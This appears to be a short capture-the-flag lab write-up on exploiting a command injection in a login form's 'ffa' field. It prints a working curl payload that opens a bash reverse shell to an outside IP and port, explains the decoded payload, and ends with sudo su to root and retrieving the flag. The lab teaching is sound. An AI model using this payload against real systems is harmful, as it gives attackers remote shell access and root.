Capstone Lab: Future Factor Authentication Exploit
Objective

Identify and exploit a command injection vulnerability in the Future Factor Authentication application on VM #3 to gain a reverse shell, escalate privileges, and retrieve the flag from the /root/ directory.
Exploit Command

bash

curl -X POST --data 'username=&password=&ffa=%24%28bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.172%2F4444%200%3E%261%27%29' http://192.168.156.16/login

Command Breakdown

    curl -X POST: Sends a POST request to the server.
    --data 'username=&password=&ffa=...': Injects the malicious payload into the ffa field.
    Payload (URL-Decoded):

    bash

    $(bash -c 'bash -i >& /dev/tcp/192.168.45.172/4444 0>&1')

        bash -c: Executes the command in a new Bash shell.
        bash -i >& /dev/tcp/...: Initiates a reverse shell connection to the attacker's machine.

Summary

This command exploits the ffa field to trigger a reverse shell on the target server. The server connects back to the attacker's machine on port 4444, providing an interactive shell.
Steps to Complete

    Run the Exploit: Execute the above curl command.
    Gain Root Access: Use sudo su in the reverse shell.
    Retrieve the Flag: Navigate to /root/ and find the flag.
